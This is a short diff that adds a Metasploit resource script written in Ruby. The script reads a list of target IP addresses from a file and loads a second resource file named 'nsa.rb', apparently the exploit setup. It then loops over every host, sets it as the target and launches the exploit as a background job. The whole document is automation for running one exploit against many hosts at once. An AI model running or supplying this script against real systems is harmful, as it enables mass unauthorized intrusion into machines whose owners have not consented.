@@ -1,0 +1,20 @@
+<ruby>
+
+hostsfile="assets/ip.txt"
+hosts=[]
+File.open(hostsfile,"r") do |f|
+f.each_line do |line|
+hosts.push line.strip
+end
+end
+# prepare the handler and console
+self.run_single("resource assets/nsa.rb")
+# iterate through each host and run the exploit
+hosts.each do |rhost|
+self.run_single("set rhost #{rhost}")
+self.run_single("set DisablePayloadHandler true")
+self.run_single("exploit -j -z")
+sleep 1
+ end
+
+</ruby>
